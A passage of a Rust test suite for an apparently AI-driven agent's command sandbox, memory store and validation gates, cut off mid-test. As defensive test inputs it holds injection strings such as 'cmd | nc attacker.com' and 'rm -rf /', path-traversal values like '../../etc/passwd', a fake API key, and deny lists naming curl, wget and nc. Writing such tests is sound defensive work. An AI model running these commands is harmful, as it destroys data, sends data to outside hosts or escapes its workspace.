// ─── Phase 2 QA Tests ────────────────────────────────────────────────────────
//!
//! 覆蓋範圍：
//!   Sandbox 白名單 | 禁止名單 | 命令注入 | 路徑穿越 | 間接 Shell 注入 |
//!   長度限制 | Locale 注入 | DB 狀態機 | 金鑰持久化 | Exit Code 對齊

use crate::config::key_persistence;
use crate::locale::{
    calibrated_command, prepend_utf8_cmd, prepend_utf8_powershell, probe_system_locale,
};
use crate::sandbox::{
    check_indirect_shell_injection, has_path_traversal_component, is_allowed_program,
    is_forbidden_program, is_path_in_workspace, is_shell_program, sanitize_arg, validate_cmd_length,
    validate_sandbox_input, SandboxResult,
};
use crate::ToolCall;
use std::path::Path;

// ─── 1. Program 白名單 ────────────────────────────────────────────────────────

#[test]
fn test_allowed_programs_basic() {
    assert!(is_allowed_program("ls"));
    assert!(is_allowed_program("dir"));
    assert!(is_allowed_program("cat"));
    assert!(is_allowed_program("echo"));
    assert!(is_allowed_program("mkdir"));
    assert!(is_allowed_program("cargo"));
    assert!(is_allowed_program("python"));
    assert!(is_allowed_program("node"));
    assert!(is_allowed_program("go"));
    assert!(is_allowed_program("gcc"));
    assert!(is_allowed_program("rustc"));
    assert!(is_allowed_program("find"));
    assert!(is_allowed_program("grep"));
    assert!(is_allowed_program("whoami"));
    assert!(is_allowed_program("ipconfig"));
    assert!(is_allowed_program("date"));
}

#[test]
fn test_allowed_programs_with_path() {
    assert!(is_allowed_program("C:\\Windows\\System32\\ls"));
    assert!(is_allowed_program("/usr/bin/echo"));
    assert!(is_allowed_program("./scripts/cargo"));
}

#[test]
fn test_allowed_programs_case_insensitive() {
    assert!(is_allowed_program("LS"));
    assert!(is_allowed_program("Cat"));
    assert!(is_allowed_program("CaRgO"));
}

#[test]
fn test_allowed_programs_rejected() {
    assert!(!is_allowed_program("rm"));
    assert!(!is_allowed_program("wget"));
    assert!(!is_allowed_program("cmd.exe"));
    assert!(!is_allowed_program("powershell"));
    assert!(!is_allowed_program("/bin/sh"));
    assert!(!is_allowed_program("bash"));
    assert!(!is_allowed_program("nc"));
    assert!(!is_allowed_program("netsh"));
    assert!(!is_allowed_program("reg"));
}

// ─── 2. 禁止名單 ──────────────────────────────────────────────────────────────

#[test]
fn test_forbidden_programs_blocked() {
    assert!(is_forbidden_program("del"));
    assert!(is_forbidden_program("rm"));
    assert!(is_forbidden_program("format"));
    assert!(is_forbidden_program("diskpart"));
    assert!(is_forbidden_program("shutdown"));
    assert!(is_forbidden_program("wget"));
    assert!(is_forbidden_program("curl"));
    assert!(is_forbidden_program("nc"));
    assert!(is_forbidden_program("netsh"));
    assert!(is_forbidden_program("regedit"));
}

// ─── 3. 命令注入防護 ──────────────────────────────────────────────────────────

#[test]
fn test_sanitize_arg_dangerous_chars() {
    assert!(sanitize_arg("hello world").is_ok());
    assert!(sanitize_arg("file.txt").is_ok());
    assert!(sanitize_arg("C:\\Users\\test\\file.txt").is_ok());

    assert!(sanitize_arg("cmd ; rm -rf /").is_err());
    assert!(sanitize_arg("cmd | nc attacker.com").is_err());
    assert!(sanitize_arg("cmd & attacker.exe").is_err());
    assert!(sanitize_arg("$(malicious)").is_err());
    assert!(sanitize_arg("cmd >> output.txt").is_err());
    assert!(sanitize_arg("<script>alert(1)</script>").is_err());
    assert!(sanitize_arg("cmd `whoami`").is_err());
    assert!(sanitize_arg("cmd && backdoor").is_err());
    assert!(sanitize_arg("cmd || exit 1").is_err());
}

#[test]
fn test_sanitize_arg_length_limit() {
    let long_arg = "a".repeat(2049);
    assert!(sanitize_arg(&long_arg).is_err());
}

#[test]
fn test_sanitize_arg_path_traversal() {
    assert!(sanitize_arg("../../etc/passwd").is_err());
    assert!(sanitize_arg("a/b/../file").is_err());
}

// ─── 4. Path Traversal ────────────────────────────────────────────────────────

#[test]
fn test_path_traversal_component_detection() {
    assert!(has_path_traversal_component("../../etc/passwd"));
    assert!(has_path_traversal_component("a/b/../../etc/passwd"));
    assert!(has_path_traversal_component("a\\..\\b"));
    assert!(!has_path_traversal_component("C:\\Users\\test\\file.txt"));
    assert!(!has_path_traversal_component("hello world"));
    assert!(!has_path_traversal_component("..hidden"));
    assert!(!has_path_traversal_component("normal/path/file.txt"));
}

#[test]
fn test_path_in_workspace_isolation() {
    let base = Path::new("C:\\Users\\test\\workspace");
    assert!(is_path_in_workspace(base, Path::new("C:\\Users\\test\\workspace\\file.txt")));
    assert!(is_path_in_workspace(base, Path::new("C:\\Users\\test\\workspace\\subdir\\file.txt")));
    assert!(!is_path_in_workspace(
        base,
        Path::new("C:\\Users\\test\\other\\file.txt")
    ));
    assert!(!is_path_in_workspace(
        base,
        Path::new("C:\\Users\\..\\..\\etc\\passwd")
    ));
}

// ─── 5. 間接 Shell 注入 ──────────────────────────────────────────────────────

#[test]
fn test_indirect_shell_injection_blocked() {
    assert!(check_indirect_shell_injection("/bin/sh", &["-c", "rm -rf /"], false).is_err());
    assert!(check_indirect_shell_injection("bash", &["-c", "ls"], false).is_err());
    assert!(check_indirect_shell_injection("cmd", &["/c", "dir"], false).is_err());
    assert!(check_indirect_shell_injection("powershell", &["-Command", "dir"], false).is_err());
    assert!(check_indirect_shell_injection("pwsh", &["-Command", "dir"], false).is_err());
}

#[test]
fn test_indirect_shell_injection_allowed_with_full_access() {
    assert!(check_indirect_shell_injection("/bin/sh", &["-c", "ls"], true).is_ok());
    assert!(check_indirect_shell_injection("bash", &["-c", "ls"], true).is_ok());
    assert!(check_indirect_shell_injection("cmd", &["/c", "dir"], true).is_ok());
}

#[test]
fn test_indirect_shell_is_program_detection() {
    assert!(is_shell_program("/bin/sh"));
    assert!(is_shell_program("/bin/bash"));
    assert!(is_shell_program("/bin/zsh"));
    assert!(is_shell_program("cmd"));
    assert!(is_shell_program("cmd.exe"));
    assert!(is_shell_program("powershell"));
    assert!(is_shell_program("pwsh"));
    assert!(!is_shell_program("echo"));
    assert!(!is_shell_program("ls"));
    assert!(!is_shell_program("cargo"));
}

// ─── 6. 指令長度限制 ──────────────────────────────────────────────────────────

#[test]
fn test_cmd_length_valid() {
    assert!(validate_cmd_length("echo", &["hello"]).is_ok());
    assert!(validate_cmd_length("cargo", &["build", "--release"]).is_ok());
}

#[test]
fn test_cmd_length_rejected() {
    let long_args = vec![String::from("a").repeat(4000); 10];
    assert!(validate_cmd_length("echo", &long_args.iter().map(|s| s.as_str()).collect::<Vec<_>>()).is_err());
}

// ─── 7. 全面驗證 ──────────────────────────────────────────────────────────────

#[test]
fn test_validate_sandbox_allows_echo() {
    assert!(validate_sandbox_input("echo", &["hello"], false, None).is_ok());
}

#[test]
fn test_validate_sandbox_blocks_unlisted_program() {
    let err = validate_sandbox_input("rm", &["-rf", "/"], false, None).unwrap_err();
    assert!(err.contains("allowlist") || err.contains("forbidden"));
}

#[test]
fn test_validate_sandbox_blocks_injection_attempt() {
    let err = validate_sandbox_input("echo", &["hello; rm -rf /"], false, None).unwrap_err();
    assert!(err.contains("dangerous") || err.contains("Argument"));
}

#[test]
fn test_validate_sandbox_full_access() {
    // full_access 允許不在白名單內的 program（但仍禁止危險序列）
    assert!(validate_sandbox_input("some_tool", &["arg1"], true, None).is_ok());
}

#[test]
fn test_validate_sandbox_full_access_rejects_injection() {
    let err = validate_sandbox_input("echo", &["$(malicious)"], true, None).unwrap_err();
    assert!(err.contains("dangerous"));
}

// ─── 8. Locale 校準 ───────────────────────────────────────────────────────────

#[test]
fn test_locale_prepend_utf8_cmd() {
    let result = prepend_utf8_cmd("echo hello");
    assert!(result.starts_with("chcp 65001"));
    assert!(result.contains("&&"));
    assert!(result.ends_with("echo hello"));
}

#[test]
fn test_locale_prepend_utf8_powershell() {
    let result = prepend_utf8_powershell("Get-Date");
    assert!(result.contains("[Console]::OutputEncoding"));
    assert!(result.contains("[System.Text.Encoding]::UTF8"));
    assert!(result.ends_with("Get-Date"));
}

#[test]
fn test_locale_probe() {
    let probe = probe_system_locale();
    assert!(probe.output_cp > 0 || cfg!(not(target_os = "windows")));
    if probe.is_utf8_ready() {
        assert!(probe.is_utf8_cp());
    }
}

#[test]
fn test_locale_calibrated_command() {
    let cmd = "echo hello";
    let calibrated = calibrated_command("cmd", cmd);
    let probe = probe_system_locale();
    if probe.is_utf8_ready() {
        assert_eq!(calibrated, cmd);
    }
}

// ─── 9. 金鑰持久化 ────────────────────────────────────────────────────────────

#[test]
fn test_key_persistence_write_and_read() {
    let tmp_dir = std::env::temp_dir().join("agnes_test_keys");
    let _ = std::fs::remove_dir_all(&tmp_dir);
    std::fs::create_dir_all(&tmp_dir).unwrap();

    key_persistence::write_api_key(&tmp_dir, "test-key-value", "").unwrap();

    let read_key = key_persistence::read_api_key(&tmp_dir).unwrap();
    assert_eq!(read_key, "test-key-value");

    let hash = key_persistence::hash_key("test-key-value");
    assert_eq!(hash.len(), 64);
    assert_ne!(hash, "test-key-value");

    let _ = std::fs::remove_file(tmp_dir.join("config.local.toml"));
    let _ = std::fs::remove_dir(tmp_dir);
}

#[test]
fn test_key_persistence_no_file() {
    let tmp_dir = std::env::temp_dir().join("agnes_test_no_config");
    let result = key_persistence::read_api_key(&tmp_dir);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "");
}

// ─── 10. DB 狀態機 ────────────────────────────────────────────────────────────

#[test]
fn test_db_open_and_init() {
    let db_path = std::env::temp_dir().join("agnes_test_open.db");
    let _ = std::fs::remove_file(&db_path);

    let _conn = crate::open_connection(&db_path).unwrap();
    assert!(db_path.exists());

    let _ = std::fs::remove_file(&db_path);
}

#[test]
fn test_db_create_and_query_project() {
    let db_path = std::env::temp_dir().join("agnes_test_proj.db");
    let _ = std::fs::remove_file(&db_path);

    let conn = crate::open_connection(&db_path).unwrap();
    let project_id = crate::create_project(&conn, "Test Project", "[]").unwrap();
    assert!(!project_id.is_empty());

    let projects = crate::get_all_projects(&conn).unwrap();
    assert_eq!(projects.len(), 1);
    assert_eq!(projects[0].name, "Test Project");

    let _ = std::fs::remove_file(&db_path);
}

#[test]
fn test_db_task_lifecycle() {
    let db_path = std::env::temp_dir().join("agnes_test_task.db");
    let _ = std::fs::remove_file(&db_path);

    let conn = crate::open_connection(&db_path).unwrap();
    let project_id = crate::create_project(&conn, "Task Test", "[]").unwrap();

    let task_id = crate::create_task(&conn, "Test Task", "{}", Some(&project_id)).unwrap();
    assert!(!task_id.is_empty());

    let status = crate::get_task_status(&conn, &task_id).unwrap();
    assert_eq!(status, "PENDING");

    crate::update_task_status(&conn, &task_id, "SUCCESS").unwrap();
    let status = crate::get_task_status(&conn, &task_id).unwrap();
    assert_eq!(status, "SUCCESS");

    let tasks = crate::get_all_tasks(&conn).unwrap();
    assert_eq!(tasks.len(), 1);

    let _ = std::fs::remove_file(&db_path);
}

#[test]
fn test_db_execution_log() {
    let db_path = std::env::temp_dir().join("agnes_test_exec.db");
    let _ = std::fs::remove_file(&db_path);

    let conn = crate::open_connection(&db_path).unwrap();
    let project_id = crate::create_project(&conn, "Exec Log Test", "[]").unwrap();
    let task_id = crate::create_task(&conn, "Test Task", "{}", Some(&project_id)).unwrap();

    crate::add_execution_log(
        &conn, &task_id, "echo hello", "hello world", "", Some(0),
    ).unwrap();

    let logs = crate::get_execution_logs_for_task(&conn, &task_id).unwrap();
    assert_eq!(logs.len(), 1);
    assert_eq!(logs[0].command, "echo hello");
    assert_eq!(logs[0].stdout, "hello world");
    assert_eq!(logs[0].stderr, "");
    assert_eq!(logs[0].exit_code, Some(0));

    let _ = std::fs::remove_file(&db_path);
}

#[test]
fn test_db_audit_log() {
    let db_path = std::env::temp_dir().join("agnes_test_audit.db");
    let _ = std::fs::remove_file(&db_path);

    let conn = crate::open_connection(&db_path).unwrap();
    let project_id = crate::create_project(&conn, "Audit Test", "[]").unwrap();
    let task_id = crate::create_task(&conn, "Test Task", "{}", Some(&project_id)).unwrap();

    crate::add_audit_log(
        &conn, &task_id, "WorkflowOptimizer", "PASS", "Task structure is valid",
    ).unwrap();

    let logs = crate::get_audit_logs_for_task(&conn, &task_id).unwrap();
    assert_eq!(logs.len(), 1);
    assert_eq!(logs[0].agent_name, "WorkflowOptimizer");
    assert_eq!(logs[0].verdict, "PASS");
    assert_eq!(logs[0].reason, "Task structure is valid");

    let _ = std::fs::remove_file(&db_path);
}

// ─── 11. Exit Code 對齊 ───────────────────────────────────────────────────────

#[test]
fn test_sandbox_result_success_alignment() {
    let success = SandboxResult {
        exit_code: Some(0),
        stdout: "done".to_string(),
        stderr: String::new(),
        is_aligned_success: true,
    };
    assert!(success.is_success());
    assert!(!success.is_false_positive());
}

#[test]
fn test_sandbox_result_failure_rejection() {
    let failure_exit = SandboxResult {
        exit_code: Some(1),
        stdout: String::new(),
        stderr: "error happened".to_string(),
        is_aligned_success: false,
    };
    assert!(!failure_exit.is_success());
    assert!(failure_exit.is_false_positive());
}

#[test]
fn test_sandbox_result_false_positive_detection() {
    // 模型說成功但 stderr 有內容 = 虛假回報
    let false_positive = SandboxResult {
        exit_code: Some(0),
        stdout: "success".to_string(),
        stderr: "warning: some issue".to_string(),
        is_aligned_success: false,
    };
    assert!(!false_positive.is_success());
    assert!(false_positive.is_false_positive());
}

#[test]
fn test_sandbox_result_exit_code_mismatch() {
    // Exit Code != 0 = 不成功，即使 stdout 說成功
    let exit_mismatch = SandboxResult {
        exit_code: Some(1),
        stdout: "completed successfully".to_string(),
        stderr: "Exit 1: command failed".to_string(),
        is_aligned_success: false,
    };
    assert!(!exit_mismatch.is_success());
    assert!(exit_mismatch.is_false_positive());
}

// ──────────────────────────────────────────────────────────────────────────────
// Phase 3: Multi-Agent Routing & Confirmation Gate Integration Tests
// ──────────────────────────────────────────────────────────────────────────────

use crate::config::Config;
use crate::orchestrator::SubAgent;
use crate::orchestrator::{ActionRiskLevel, Orchestrator, PendingAction};

#[test]
fn test_22_agent_count() {
    let agents = SubAgent::all_agents();
    assert_eq!(agents.len(), 22, "必須有 22 個代理人");
}

#[test]
fn test_22_agent_groups() {
    let agents = SubAgent::all_agents();
    let groups: Vec<&str> = agents.iter().map(|a| a.group.as_str()).collect();
    assert!(groups.contains(&"Meta-Workflow"), "必須包含 Meta-Workflow 組");
    assert!(groups.contains(&"Management"), "必須包含 Management 組");
    assert!(groups.contains(&"Performance"), "必須包含 Performance 組");
    assert!(groups.contains(&"Security"), "必須包含 Security 組");
    assert!(groups.contains(&"Engineering"), "必須包含 Engineering 組");
    assert!(groups.contains(&"Memory-Distillation"), "必須包含 Memory-Distillation 組");
}

#[test]
fn test_group_size() {
    let agents = SubAgent::all_agents();
    let meta: Vec<_> = agents.iter().filter(|a| a.group == "Meta-Workflow").collect();
    let mgmt: Vec<_> = agents.iter().filter(|a| a.group == "Management").collect();
    let perf: Vec<_> = agents.iter().filter(|a| a.group == "Performance").collect();
    let sec: Vec<_> = agents.iter().filter(|a| a.group == "Security").collect();
    let eng: Vec<_> = agents.iter().filter(|a| a.group == "Engineering").collect();
    assert_eq!(meta.len(), 4, "Meta-Workflow 組必須有 4 個代理");
    assert_eq!(mgmt.len(), 3, "Management 組必須有 3 個代理");
    assert_eq!(perf.len(), 3, "Performance 組必須有 3 個代理");
    assert_eq!(sec.len(), 3, "Security 組必須有 3 個代理");
    assert_eq!(eng.len(), 4, "Engineering 組必須有 4 個代理");
}

#[test]
fn test_agent_priorities_sorted() {
    let agents = SubAgent::all_agents();
    for i in 0..agents.len() - 1 {
        assert!(
            agents[i].priority < agents[i + 1].priority,
            "代理人必須按優先級排序，索引 {} 的優先級 {} 不小於 {} 的 {}",
            i,
            agents[i].priority,
            i + 1,
            agents[i + 1].priority,
        );
    }
}

#[test]
fn test_agent_prerequisites_valid() {
    let agents = SubAgent::all_agents();
    let names: std::collections::HashSet<&str> =
        agents.iter().map(|a| a.role.as_str()).collect();
    for agent in &agents {
        for prereq in &agent.prerequisites {
            assert!(
                names.contains(prereq.as_str()),
                "代理人 '{}' 的前置依賴 '{}' 不存在於代理人列表中",
                agent.role,
                prereq
            );
        }
    }
}

#[test]
fn test_core_engineer_produces_output() {
    let agents = SubAgent::all_agents();
    let core = agents.iter().find(|a| a.role == "CoreEngineCoder").expect("必須有 CoreEngineCoder");
    assert!(core.produces_output, "CoreEngineCoder 必須產出代碼");
}

#[test]
fn test_sandbox_tester_no_output() {
    let agents = SubAgent::all_agents();
    let sandbox = agents.iter().find(|a| a.role == "SandboxRuntimeTester").expect("必須有 SandboxRuntimeTester");
    assert!(!sandbox.produces_output, "SandboxRuntimeTester 不應產出代碼");
}

#[test]
fn test_topological_order_respects_prerequisites() {
    let agents = SubAgent::all_agents();
    let name_to_agent: std::collections::HashMap<&str, &SubAgent> =
        agents.iter().map(|a| (a.role.as_str(), a)).collect();

    for agent in &agents {
        for prereq in &agent.prerequisites {
            if let Some(pa) = name_to_agent.get(prereq.as_str()) {
                assert!(
                    pa.priority < agent.priority,
                    "代理人 '{}' 的優先級必須高於前置依賴 '{}'",
                    agent.role,
                    prereq
                );
            }
        }
    }
}

#[test]
fn test_pending_action_risk_levels() {
    let action = PendingAction {
        id: "test-001".to_string(),
        agent_role: "CoreEngineCoder".to_string(),
        action_type: "sqlite_state".to_string(),
        target_path: "C:\\test".to_string(),
        description: "Test action".to_string(),
        risk: ActionRiskLevel::Critical,
        preview: "Preview text".to_string(),
        created_at: "now".to_string(),
        approved: false,
        rejected: false,
        rejection_reason: "".to_string(),
    };
    assert!(!action.is_approved());
    assert!(!action.is_rejected());
    assert!(action.is_pending());
}

#[test]
fn test_pending_action_approved() {
    let mut action = PendingAction {
        id: "test-002".to_string(),
        agent_role: "SandboxTester".to_string(),
        action_type: "exit_code_check".to_string(),
        target_path: "C:\\test".to_string(),
        description: "Test".to_string(),
        risk: ActionRiskLevel::High,
        preview: "Preview".to_string(),
        created_at: "now".to_string(),
        approved: false,
        rejected: false,
        rejection_reason: "".to_string(),
    };
    action.approve();
    assert!(action.is_approved());
    assert!(!action.is_pending());
}

#[test]
fn test_pending_action_rejected() {
    let mut action = PendingAction {
        id: "test-003".to_string(),
        agent_role: "SecurityAuditor".to_string(),
        action_type: "hardcode_scan".to_string(),
        target_path: "C:\\test".to_string(),
        description: "Test".to_string(),
        risk: ActionRiskLevel::Critical,
        preview: "Preview".to_string(),
        created_at: "now".to_string(),
        approved: false,
        rejected: false,
        rejection_reason: "".to_string(),
    };
    action.reject("Found hardcoded key".to_string());
    assert!(action.is_rejected());
    assert_eq!(action.rejection_reason, "Found hardcoded key");
}

#[test]
fn test_orchestrator_initialization() {
    let config = Config::default();
    let _orchestrator = Orchestrator::new(config);
}

#[test]
fn test_risk_level_from_string() {
    assert!(matches!(ActionRiskLevel::Low, ActionRiskLevel::Low));
    assert!(matches!(ActionRiskLevel::Medium, ActionRiskLevel::Medium));
    assert!(matches!(ActionRiskLevel::High, ActionRiskLevel::High));
    assert!(matches!(ActionRiskLevel::Critical, ActionRiskLevel::Critical));
}

#[test]
fn test_multi_folder_selection_logic() {
    // Tests the selection logic for multi-folder projects
    // (ProjectFolder struct is in main.rs — testing the Vec<usize> logic)
    let mut selected: Vec<usize> = vec![0];

    // Select second project
    selected.push(1);
    assert_eq!(selected.len(), 2);
    assert!(selected.contains(&0));
    assert!(selected.contains(&1));

    // Deselect first project
    selected.retain(|&i| i != 0);
    assert_eq!(selected.len(), 1);
    assert!(selected.contains(&1));

    // Empty selection keeps at least one
    selected.clear();
    selected.push(2);
    assert!(!selected.is_empty());
}

// ─── Phase 1: Memory & Validation Pipeline Tests ──────────────────────────────

#[test]
fn test_memory_estimation() {
    // English ASCII: 4 chars/token
    assert_eq!(crate::memory::estimate_tokens("abcd"), 1);
    assert_eq!(crate::memory::estimate_tokens("abcdefgh"), 2);
    // CJK: 1 token/char
    assert_eq!(crate::memory::estimate_tokens("測試中"), 3);
    // Mixed
    assert_eq!(crate::memory::estimate_tokens("測試abcd中"), 4);
}

#[test]
fn test_memory_sliding_window() {
    let text = "line1\nline2\nline3\nline4\nline5";
    // Each line is about 5 chars -> 2 tokens
    let chunks = crate::memory::sliding_window_chunk(text, 5, 1);
    assert!(chunks.len() >= 2);
    for chunk in &chunks {
        assert!(!chunk.text.is_empty());
    }
}

#[test]
fn test_validation_slop_words() {
    let config = Config::default();
    let tool_calls = vec![];
    let messages = vec![serde_json::json!({
        "role": "assistant",
        "content": "Furthermore, we must delve deep into this crucial topic."
    })];
    let audits = crate::validation::run_all_gates(&config, &tool_calls, &messages);
    let slop_audit = audits.iter().find(|a| a.agent_name == "SlopVibeAuditor").unwrap();
    assert_eq!(slop_audit.verdict, "REJECTED");
}

#[test]
fn test_validation_defensive_coding() {
    let config = Config::default();
    let tool_calls = vec![ToolCall {
        name: "run_command".to_string(),
        path: None,
        content: "cargo test; rm -rf /".to_string(),
    }];
    let messages = vec![];
    let audits = crate::validation::run_all_gates(&config, &tool_calls, &messages);
    let defensive_audit = audits.iter().find(|a| a.agent_name == "DefensiveCodingSpecialist").unwrap();
    assert_eq!(defensive_audit.verdict, "REJECTED");
}

#[test]
fn test_validation_sk_key_leak() {
    let config = Config::default();
    let tool_calls = vec![ToolCall {
        name: "write_file".to_string(),
        path: Some("src/main.rs".to_string()),
        content: "let key = \"sk-TESTFAKEKEY0000000000000000000000000000000000000\";".to_string(),
    }];
    let messages = vec![];
    let audits = crate::validation::run_all_gates(&config, &tool_calls, &messages);
    let compliance_audit = audits.iter().find(|a| a.agent_name == "SecurityComplianceAuditor").unwrap();
    assert_eq!(compliance_audit.verdict, "REJECTED");
}

#[test]
fn test_memory_splitting() {
    let tmp_dir = std::env::temp_dir().join("agnes_test_splitting");
    let _ = std::fs::remove_dir_all(&tmp_dir);
    std::fs::create_dir_all(&tmp_dir).unwrap();

    let db_path = tmp_dir.join("test.db");
    let conn = crate::open_connection(&db_path).unwrap();

    let manager = crate::MemoryManager::new(tmp_dir.clone());
    // Create large content: > 2000 tokens
    let large_content = "測試\n".repeat(1100);
    let path = manager.save_memory(&conn, "rust", "large_memory", &large_content, &crate::MemoryConfig::default()).unwrap();

    assert!(path.to_string_lossy().contains("large_memory_part"));

    let files = std::fs::read_dir(tmp_dir.join("memory_tags").join("rust")).unwrap();
    let mut file_count = 0;
    for entry in files.flatten() {
        if entry.path().is_file() {
            file_count += 1;
        }
    }
    assert!(file_count >= 2, "Should split into at least 2 files");

    let _ = std::fs::remove_dir_all(&tmp_dir);
}

#[test]
fn test_rag_stage3_inject() {
    let tmp_dir = std::env::temp_dir().join("agnes_test_rag3");
    let _ = std::fs::remove_dir_all(&tmp_dir);
    std::fs::create_dir_all(&tmp_dir).unwrap();

    let manager = crate::MemoryManager::new(tmp_dir.clone());
    let file1 = tmp_dir.join("file1.md");
    std::fs::write(&file1, "memory content 1").unwrap();
    let file2 = tmp_dir.join("file2.md");
    std::fs::write(&file2, "memory content 2").unwrap();

    let result = manager.stage3_inject_contents(&[file1, file2]);
    assert!(result.contains("memory content 1"));
    assert!(result.contains("memory content 2"));
    assert!(result.contains("=== RAG MEMORY CONTEXT ==="));

    let _ = std::fs::remove_dir_all(&tmp_dir);
}

#[test]
fn test_token_budgeter() {
    let mut budgeter = crate::TokenBudgeter::new(1000);
    assert!(!budgeter.is_locked());
    assert_eq!(budgeter.total_spent(), 0);

    budgeter.record_usage(400, 200);
    assert_eq!(budgeter.total_spent(), 600);
    assert!(!budgeter.is_locked());
    assert!((budgeter.budget_ratio() - 0.6).abs() < 1e-5);

    budgeter.record_usage(300, 200);
    assert_eq!(budgeter.total_spent(), 1100);
    assert!(budgeter.is_locked());
}

#[test]
fn test_large_scale_chunking_12m() {
    let repeat_count = 400_000;
    let line_content = "測試";
    let synthetic_text = format!("{}\n", line_content).repeat(repeat_count);
    
    let chunk_size = 100_000;
    let overlap_lines = 50;
    
    let chunks = crate::memory::sliding_window_chunk(&synthetic_text, chunk_size, overlap_lines);
    
    assert!(!chunks.is_empty(), "Should generate chunks");
    
    for chunk in &chunks {
        let tokens = crate::memory::estimate_tokens(&chunk.text);
        assert!(tokens <= chunk_size, "Chunk tokens {} should be <= {}", tokens, chunk_size);
    }
    
    for i in 0..chunks.len()-1 {
        let current_tail = &chunks[i].overlap_tail;
        let next_head = &chunks[i+1].overlap_head;
        assert_eq!(current_tail, next_head, "Chunk {} tail should match Chunk {} head overlap", i, i+1);
        
        let lines_tail = current_tail.lines().count();
        if lines_tail > 0 {
            assert_eq!(lines_tail, overlap_lines, "Overlap lines should match config");
        }
    }
}

#[test]
fn test_stage0_bypass() {
    let tmp_dir = std::env::temp_dir().join("agnes_test_stage0");
    let _ = std::fs::remove_dir_all(&tmp_dir);
    std::fs::create_dir_all(&tmp_dir).unwrap();

    let db_path = tmp_dir.join("test.db");
    let conn = crate::open_connection(&db_path).unwrap();
    crate::init_db(&conn).unwrap();

    let manager = crate::MemoryManager::new(tmp_dir.clone());
    
    let memory_content = "Agnes-AI project is a high-defense desktop engine designed to replace Chromium core.";
    let path = manager.save_memory(&conn, "rust", "agnes_project", memory_content, &crate::MemoryConfig::default()).unwrap();
    
    let relative_path = path.strip_prefix(&tmp_dir).unwrap().to_string_lossy().to_string();
    let count: i32 = conn.query_row(
        "SELECT COUNT(*) FROM memory_index WHERE file_path = ?1",
        [relative_path],
        |row| row.get(0)
    ).unwrap();
    assert_eq!(count, 1, "Memory should be indexed in SQLite");
    
    let files = manager.stage0_local_fts5(&conn, "Chromium core", 0.8).unwrap();
    assert!(!files.is_empty(), "Should find matches on Stage 0");
    let file_str = files[0].to_string_lossy().replace('\\', "/");
    assert!(file_str.contains("memory_tags/rust/"));
    assert!(file_str.contains("agnes_project.md"));
    
    let _ = std::fs::remove_dir_all(&tmp_dir);
}

#[test]
fn test_qa_replay() {
    let fixture_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join("qa_corpus");
        
    if !fixture_dir.exists() {
        std::fs::create_dir_all(&fixture_dir).unwrap();
        let dummy_dir = fixture_dir.join("E_PATH");
        std::fs::create_dir_all(&dummy_dir).unwrap();
        let dummy_file = dummy_dir.join("dummy_sample.json");
        let dummy_json = serde_json::json!({
            "tool_calls": [
                {
                    "name": "write_file",
                    "path": "../outside.txt",
                    "content": "some content"
                }
            ],
            "failure_code": "G4",
            "expected_verdict": "REJECTED"
        });
        std::fs::write(&dummy_file, serde_json::to_string_pretty(&dummy_json).unwrap()).unwrap();
    }
    
    let mut files_tested = 0;
    for entry in walkdir::WalkDir::new(&fixture_dir) {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };
        let path = entry.path();
        if path.is_file() && path.extension().is_some_and(|ext| ext == "json") {
            let content = std::fs::read_to_string(path).expect("Failed to read fixture");
            let val: serde_json::Value = serde_json::from_str(&content).expect("Failed to parse fixture JSON");
            
            let tool_calls_val = &val["tool_calls"];
            let mut tool_calls = Vec::new();
            if let Some(arr) = tool_calls_val.as_array() {
                for tc_val in arr {
                    tool_calls.push(crate::ToolCall {
                        name: tc_val["name"].as_str().unwrap_or("").to_string(),
                        path: tc_val["path"].as_str().map(|s| s.to_string()),
                        content: tc_val["content"].as_str().unwrap_or("").to_string(),
                    });
                }
            }
            
            let expected_verdict = val["expected_verdict"].as_str().unwrap_or("REJECTED");
            let expected_gate_id = val["failure_code"].as_str().unwrap_or("");
            
            let config = crate::Config::default();
            let audits = crate::run_all_gates(&config, &tool_calls, &[]);
            
            let any_rejected = crate::AgentEngine::any_rejected(&audits);
            if expected_verdict == "REJECTED" {
                assert!(any_rejected, "Fixture at {:?} was expected to be REJECTED, but it PASSED", path);
                if !expected_gate_id.is_empty() {
                    let has_gate = audits.iter().any(|a| a.verdict == "REJECTED" && a.reason.contains(expected_gate_id));
                    assert!(has_gate, "Fixture at {:?} was expected to fail on gate {}, but audits were: {:?}", path, expected_gate_id, audits);
                }
            } else {
                assert!(!any_rejected, "Fixture at {:?} was expected to PASS, but it was REJECTED: {:?}", path, audits);
            }
            files_tested += 1;
        }
    }
    assert!(files_tested > 0, "No replay fixtures found");
}

// ─── 蒸餾管線確定性審查（TokenOverlapAuditor，0 token）────────────────────────

#[test]
fn test_audit_distillation_rejects_empty() {
    let original = "原始對話內容\n".repeat(100);
    assert!(crate::memory::audit_distillation(&original, "").is_err());
    assert!(crate::memory::audit_distillation(&original, "   \n  ").is_err());
}

#[test]
fn test_audit_distillation_rejects_growth() {
    let original = "短文";
    let bloated = "這段蒸餾結果反而比原文更長，違反壓縮的基本定義".repeat(10);
    let err = crate::memory::audit_distillation(original, &bloated).unwrap_err();
    assert!(err.contains("TokenOverlapAuditor"));
}

#[test]
fn test_audit_distillation_passes_compression() {
    let original = "關鍵參數 timeout=30 路徑 C:/work/app 決策：採用方案 B\n".repeat(50);
    let distilled = "timeout=30；路徑 C:/work/app；決策：方案 B";
    assert!(crate::memory::audit_distillation(&original, distilled).is_ok());
}

// ─── 引號感知指令切割 ─────────────────────────────────────────────────────────

#[test]
fn test_split_command_line_quotes() {
    let parts = crate::split_command_line("cargo test --manifest-path \"C:/Program Files/app/Cargo.toml\"");
    assert_eq!(parts, vec!["cargo", "test", "--manifest-path", "C:/Program Files/app/Cargo.toml"]);
}

#[test]
fn test_split_command_line_plain_and_single_quotes() {
    assert_eq!(crate::split_command_line("echo hello world"), vec!["echo", "hello", "world"]);
    assert_eq!(crate::split_command_line("grep 'two words' file.txt"), vec!["grep", "two words", "file.txt"]);
    assert!(crate::split_command_line("   ").is_empty());
}

// ─── 寫檔後沙盒硬性對齊（rustc 單檔編譯檢查）──────────────────────────────────

#[test]
fn test_check_rs_compiles_catches_lifetime_error() {
    let dir = std::env::temp_dir().join("agnes_align_test");
    let _ = std::fs::create_dir_all(&dir);
    let bad = dir.join("bad_lifetime.rs");
